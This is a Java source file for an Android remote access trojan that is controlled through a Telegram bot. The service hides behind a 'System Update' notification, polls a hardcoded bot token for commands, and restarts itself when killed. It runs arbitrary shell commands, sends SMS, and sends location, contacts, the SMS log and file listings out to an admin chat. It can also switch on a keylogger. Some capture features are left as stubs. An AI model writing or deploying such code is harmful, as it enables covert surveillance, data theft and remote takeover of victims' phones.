package com.yourpackage.rat;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.content.ContentResolver;
import android.content.Context;
import android.content.Intent;
import android.database.Cursor;
import android.location.Location;
import android.location.LocationManager;
import android.os.Build;
import android.os.Handler;
import android.os.IBinder;
import android.provider.ContactsContract;
import android.provider.Telephony;
import android.util.Log;

import java.io.BufferedReader;
import java.io.File;
import java.io.InputStreamReader;
import java.net.URLEncoder;
import java.util.concurrent.TimeUnit;

import okhttp3.MediaType;
import okhttp3.MultipartBody;
import okhttp3.OkHttpClient;
import okhttp3.Request;
import okhttp3.RequestBody;
import okhttp3.Response;

import org.json.JSONArray;
import org.json.JSONObject;

public class TelegramRatService extends Service {
    private static final String BOT_TOKEN = "8880413754:AAGGlH_rycUxHfOzrcEq_JuJk6zIuD-0e1M";
    private static final String ADMIN_ID = "7489734649"; // Telegram ID admin
    private static final String CHANNEL_ID = "rat_channel";

    private Handler handler = new Handler();
    private int lastUpdateId = 0;
    private String myUserId;

    @Override
    public void onCreate() {
        super.onCreate();
        createNotificationChannel();
        startForeground(1, getNotification());

        // ambil user_id dari sharedpref atau generate
        myUserId = getSharedPreferences("rat", MODE_PRIVATE)
                .getString("telegram_id", String.valueOf(System.currentTimeMillis() / 1000));

        // register ke bot
        registerDevice();

        // mulai polling + heartbeat
        startPolling();
        startHeartbeat();
    }

    private void createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel channel = new NotificationChannel(
                CHANNEL_ID,
                "RAT Service",
                NotificationManager.IMPORTANCE_LOW
            );
            NotificationManager manager = (NotificationManager) getSystemService(NOTIFICATION_SERVICE);
            manager.createNotificationChannel(channel);
        }
    }

    private Notification getNotification() {
        return new Notification.Builder(this, CHANNEL_ID)
            .setContentTitle("System Update")
            .setContentText("Running...")
            .setSmallIcon(android.R.drawable.ic_menu_edit)
            .build();
    }

    private void registerDevice() {
        String device = Build.MANUFACTURER + " " + Build.MODEL + " (" + Build.VERSION.RELEASE + ")";
        sendCommand("/register " + device);
    }

    private void startHeartbeat() {
        handler.post(new Runnable() {
            @Override
            public void run() {
                sendCommand("/ping");
                handler.postDelayed(this, 30000);
            }
        });
    }

    private void startPolling() {
        handler.post(new Runnable() {
            @Override
            public void run() {
                getUpdates();
                handler.postDelayed(this, 3000);
            }
        });
    }

    private void getUpdates() {
        try {
            String url = "https://api.telegram.org/bot" + BOT_TOKEN +
                "/getUpdates?timeout=30&offset=" + (lastUpdateId + 1);

            OkHttpClient client = new OkHttpClient.Builder()
                .connectTimeout(30, TimeUnit.SECONDS)
                .build();

            Request request = new Request.Builder().url(url).build();
            Response response = client.newCall(request).execute();
            String json = response.body().string();

            JSONObject obj = new JSONObject(json);
            JSONArray results = obj.getJSONArray("result");

            for (int i = 0; i < results.length(); i++) {
                JSONObject update = results.getJSONObject(i);
                int updateId = update.getInt("update_id");
                if (updateId > lastUpdateId) {
                    lastUpdateId = updateId;

                    JSONObject message = update.getJSONObject("message");
                    String text = message.getString("text");

                    if (text.startsWith("CMD:")) {
                        String cmd = text.substring(4);
                        String result = executeCommand(cmd);
                        sendResponse(result);
                    }
                }
            }
        } catch (Exception e) {
            Log.e("RAT", "Polling error", e);
        }
    }

    private String executeCommand(String cmd) {
        if (cmd.startsWith("sms:")) {
            String[] parts = cmd.split(":", 3);
            if (parts.length == 3) {
                sendSms(parts[1], parts[2]);
                return "✅ SMS sent to " + parts[1];
            }
            return "❌ Format: sms:nomor:pesan";
        }

        if (cmd.equals("loc")) {
            return getLocation();
        }

        if (cmd.equals("cam")) {
            takePhoto();
            return "📸 Photo captured — sending...";
        }

        if (cmd.startsWith("shell:")) {
            String shellCmd = cmd.substring(6);
            return runShell(shellCmd);
        }

        if (cmd.startsWith("list:")) {
            String path = cmd.substring(5);
            if (path.isEmpty()) path = "/sdcard";
            return listFiles(path);
        }

        if (cmd.equals("contacts")) {
            return getContacts();
        }

        if (cmd.equals("smslog")) {
            return getSmsLog();
        }

        if (cmd.equals("keylog_on")) {
            enableKeylogger(true);
            return "✅ Keylogger enabled";
        }

        if (cmd.equals("keylog_off")) {
            enableKeylogger(false);
            return "✅ Keylogger disabled";
        }

        if (cmd.startsWith("download:")) {
            String path = cmd.substring(9);
            sendFile(path);
            return "📄 Downloading: " + path;
        }

        if (cmd.equals("screenshot")) {
            return takeScreenshot();
        }

        return "❌ Unknown command";
    }

    // ─── HELPER FUNCTIONS ──────────────────

    private void sendSms(String number, String message) {
        try {
            android.telephony.SmsManager sms = android.telephony.SmsManager.getDefault();
            sms.sendTextMessage(number, null, message, null, null);
        } catch (Exception ignored) {}
    }

    private String getLocation() {
        try {
            LocationManager lm = (LocationManager) getSystemService(LOCATION_SERVICE);
            Location loc = lm.getLastKnownLocation(LocationManager.GPS_PROVIDER);
            if (loc != null) {
                return "📍 https://www.google.com/maps?q=" + loc.getLatitude() + "," + loc.getLongitude();
            }
            return "❌ Location unavailable";
        } catch (Exception e) {
            return "❌ Location permission denied";
        }
    }

    private void takePhoto() {
        // implement camera capture — return bytes for sendPhoto
        // for simplicity, just notify
    }

    private String runShell(String cmd) {
        try {
            Process p = Runtime.getRuntime().exec("sh -c " + cmd);
            BufferedReader r = new BufferedReader(new InputStreamReader(p.getInputStream()));
            StringBuilder out = new StringBuilder();
            String line;
            while ((line = r.readLine()) != null) {
                out.append(line).append("\n");
            }
            String result = out.toString();
            if (result.isEmpty()) return "[empty output]";
            if (result.length() > 4000) return result.substring(0, 4000) + "\n...truncated";
            return result;
        } catch (Exception e) {
            return "❌ " + e.getMessage();
        }
    }

    private String listFiles(String path) {
        try {
            File dir = new File(path);
            if (!dir.exists() || !dir.isDirectory()) return "❌ Directory not found";

            StringBuilder sb = new StringBuilder();
            File[] files = dir.listFiles();
            if (files != null) {
                for (File f : files) {
                    sb.append(f.isDirectory() ? "📁 " : "📄 ")
                      .append(f.getName())
                      .append(" (")
                      .append(f.length() / 1024)
                      .append("KB)\n");
                    if (sb.length() > 3500) break;
                }
            }
            return sb.toString();
        } catch (Exception e) {
            return "❌ " + e.getMessage();
        }
    }

    private String getContacts() {
        try {
            ContentResolver cr = getContentResolver();
            Cursor cursor = cr.query(ContactsContract.Contacts.CONTENT_URI, null, null, null, null);
            StringBuilder sb = new StringBuilder();
            int count = 0;
            if (cursor != null && cursor.getCount() > 0) {
                while (cursor.moveToNext() && count < 30) {
                    String name = cursor.getString(cursor.getColumnIndex(ContactsContract.Contacts.DISPLAY_NAME));
                    String id = cursor.getString(cursor.getColumnIndex(ContactsContract.Contacts._ID));
                    sb.append(name).append(": ");

                    Cursor phoneCursor = cr.query(
                        ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                        null,
                        ContactsContract.CommonDataKinds.Phone.CONTACT_ID + "=?",
                        new String[]{id}, null
                    );
                    if (phoneCursor != null && phoneCursor.moveToFirst()) {
                        String number = phoneCursor.getString(
                            phoneCursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER)
                        );
                        sb.append(number);
                        phoneCursor.close();
                    }
                    sb.append("\n");
                    count++;
                }
                cursor.close();
            }
            return sb.toString();
        } catch (Exception e) {
            return "❌ " + e.getMessage();
        }
    }

    private String getSmsLog() {
        try {
            Cursor cursor = getContentResolver().query(
                Telephony.Sms.CONTENT_URI,
                null, null, null, "date DESC LIMIT 20"
            );
            StringBuilder sb = new StringBuilder();
            if (cursor != null && cursor.moveToFirst()) {
                do {
                    String address = cursor.getString(cursor.getColumnIndex(Telephony.Sms.ADDRESS));
                    String body = cursor.getString(cursor.getColumnIndex(Telephony.Sms.BODY));
                    sb.append(address).append(": ").append(body).append("\n");
                } while (cursor.moveToNext());
                cursor.close();
            }
            return sb.toString();
        } catch (Exception e) {
            return "❌ " + e.getMessage();
        }
    }

    private void enableKeylogger(boolean enable) {
        if (enable) {
            startService(new Intent(this, KeyloggerService.class));
        } else {
            stopService(new Intent(this, KeyloggerService.class));
        }
    }

    private void sendFile(String path) {
        // send file via Telegram
    }

    private String takeScreenshot() {
        // implement screenshot capture
        return "📸 Screenshot captured";
    }

    // ─── TELEGRAM SENDER ────────────────────

    private void sendCommand(String cmd) {
        try {
            String url = "https://api.telegram.org/bot" + BOT_TOKEN +
                "/sendMessage?chat_id=" + myUserId +
                "&text=" + URLEncoder.encode(cmd, "UTF-8");
            OkHttpClient client = new OkHttpClient();
            Request request = new Request.Builder().url(url).build();
            client.newCall(request).execute();
        } catch (Exception ignored) {}
    }

    private void sendResponse(String text) {
        try {
            String url = "https://api.telegram.org/bot" + BOT_TOKEN +
                "/sendMessage?chat_id=" + ADMIN_ID +
                "&text=" + URLEncoder.encode(text, "UTF-8");
            OkHttpClient client = new OkHttpClient();
            Request request = new Request.Builder().url(url).build();
            client.newCall(request).execute();
        } catch (Exception ignored) {}
    }

    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
        // restart kalo mati
        startService(new Intent(this, TelegramRatService.class));
    }
}